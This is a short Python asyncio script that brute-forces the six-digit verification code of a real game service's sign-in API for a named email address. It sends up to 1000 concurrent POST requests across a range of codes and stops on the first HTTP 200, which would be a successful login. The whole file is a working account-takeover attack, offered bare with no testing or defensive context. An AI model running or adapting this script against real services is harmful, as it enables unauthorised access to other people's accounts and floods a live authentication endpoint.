import asyncio, time
from aiohttp import ClientSession

async def post(url, session, num):
    global t1, numReq

    async with session.post(url, json={'email': 'benbusche2004@gmail.com', 'code':str(num)}) as response:
        if int(response.status) == 200:
            print(num, response.status)
            raise Exception("Result found. Terminating program. The code is: " + str(num))
        #print(response.json)
        if num % numReq == 0:
            print(num, response.status)
            print(f"Took {(time.time() - t1) / numReq} seconds per request")
            t1 = time.time()

        return await response.read()


async def bound_fetch(sem, url, session, num):
    # Getter function with semaphore.
    async with sem:
        await post(url, session, num)


async def run():
    url = 'https://api.dashcraft.io/auth/signIn'
    tasks = []
    # create instance of Semaphore
    sem = asyncio.Semaphore(numReq)

    # Create client session that will ensure we dont open new connection
    # per each request.
    async with ClientSession() as session:
        for i in range(950000, 999999):
            # pass Semaphore and session to every GET request
            task = asyncio.ensure_future(bound_fetch(sem, url, session, i))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses

t1 = time.time()

numReq = 1000

loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run())
loop.run_until_complete(future)